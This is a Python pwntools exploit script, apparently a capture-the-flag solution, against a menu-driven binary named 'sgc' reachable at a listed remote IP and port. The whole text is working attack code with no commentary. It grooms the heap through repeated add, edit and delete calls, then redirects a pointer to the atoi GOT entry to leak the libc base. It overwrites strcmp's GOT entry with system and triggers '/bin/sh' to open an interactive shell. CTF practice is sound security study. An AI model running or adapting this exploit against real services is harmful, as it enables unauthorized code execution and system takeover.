#!/usr/bin/env python
from pwn import *

def add(name,group,age):
    s.sendlineafter('Action: ','0')
    s.sendlineafter('name: ',name)
    s.sendlineafter('group: ',group)
    s.sendlineafter('age: ',str(age))

def display(index):
    s.sendlineafter('Action: ','2')
    s.sendlineafter('index: ',str(index))
    s.recvuntil('Name: ')
    user = s.recvline()[:-1]
    s.recvuntil('Group: ')
    group = s.recvline()[:-1]
    s.recvuntil('Age: ')
    age = int(s.recvline()[:-1])
    return user,group,age

def edit(index,group,yn):
    s.sendlineafter('Action: ','3')
    s.sendlineafter('index: ',str(index))
    s.sendlineafter('(y/n): ',yn)
    s.sendlineafter('name: ',group)

def delete(index):
    s.sendlineafter('Action: ','4')
    s.sendlineafter('index: ',str(index))

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./sgc') # ,env = {'LD_PRELOAD': './libc-2.26.so'})
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        s = remote('35.198.176.224',1337)
        libc = ELF('./libc-2.26.so')

    elf = ELF('./sgc')

    add('B','B',0)
    for i in range(5):
        add('A','A',0)
        delete(1)
    for i in range(0xfe):
        add('A','A',0)
        edit(1,'B','n')
        delete(1)
    add('A','A',0)
    add('A','A',0)
    add('B' * 0x50,'B',0)
    add('B' * 0x50,'B',0)
    edit(1,'\0' * 0x10 + p64(elf.got['atoi']),'y')
    libc_base = u64(display(4)[1].ljust(8,'\0')) - libc.symbols['atoi']
    log.info('libc base: %#x' % libc_base)
    edit(1,'\0' * 0x10 + p64(elf.got['strcmp']),'y')
    edit(4,p64(libc_base + libc.symbols['system']),'y')
    add('A','/bin/sh',0)
    s.interactive()
